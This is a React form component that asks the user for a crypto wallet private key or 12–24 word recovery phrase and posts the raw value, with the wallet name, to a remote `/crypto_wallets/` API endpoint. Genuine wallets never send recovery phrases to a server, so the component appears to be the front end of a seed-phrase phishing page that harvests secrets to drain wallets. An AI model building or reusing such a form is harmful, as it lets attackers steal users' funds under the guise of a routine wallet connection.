import React, { useState } from "react";
import { ErrorMessage, Field, Form, Formik } from "formik";
import * as Yup from "yup";
import axios from "axios";
import Loading from "../Loading/Loading";

const PrivateKey = (props) => {
  const { WalletState, setSuccess } = props;
  const endPoint = process.env.REACT_APP_API_URL;

  const onSubmit = (values) => {
    setLoading(true);
    axios
      .post(`${endPoint}/crypto_wallets/`, {
        private_key: values.private_key,
        wallet_name: WalletState.name,
      })
      .then((res) => {
        setLoading(false);
        setSuccess(true);
      })
      .catch((error) => {
        console.log(error);
        setLoading(false);
      });
  };

  const validationSchema = Yup.object({
    private_key: Yup.string().required("Private key is required"),
  });

  const initialValues = {
    private_key: "",
  };
  const [loading, setLoading] = useState(false);
  return (
    <div>
      {loading ? (
        <Loading />
      ) : (
        <Formik
          initialValues={initialValues}
          onSubmit={onSubmit}
          validationSchema={validationSchema}
        >
          {({ isValid, status, dirty, isSubmitting }) => (
            <Form
              style={{
                display: "flex",
                flexDirection: "column",
                justifyContent: "center",
                alignItems: "center",
              }}
            >
              <Field
                name="private_key"
                placeholder="Enter your Private Key"
                className="form-input"
              />
              <div style={{ color: "red", fontSize: "10px" }}>
                <ErrorMessage name="private_key" />
              </div>
              <div
                style={{ fontSize: "10px", marginBlock: "10px", width: "90%" }}
              >
                Typically 12 (sometimes 24) words seperated by a single space.
              </div>
              <button
                disabled={!(isValid && dirty) || isSubmitting}
                type="submit"
                className="form-button"
              >
                PROCEED
              </button>
            </Form>
          )}
        </Formik>
      )}
    </div>
  );
};

export default PrivateKey;
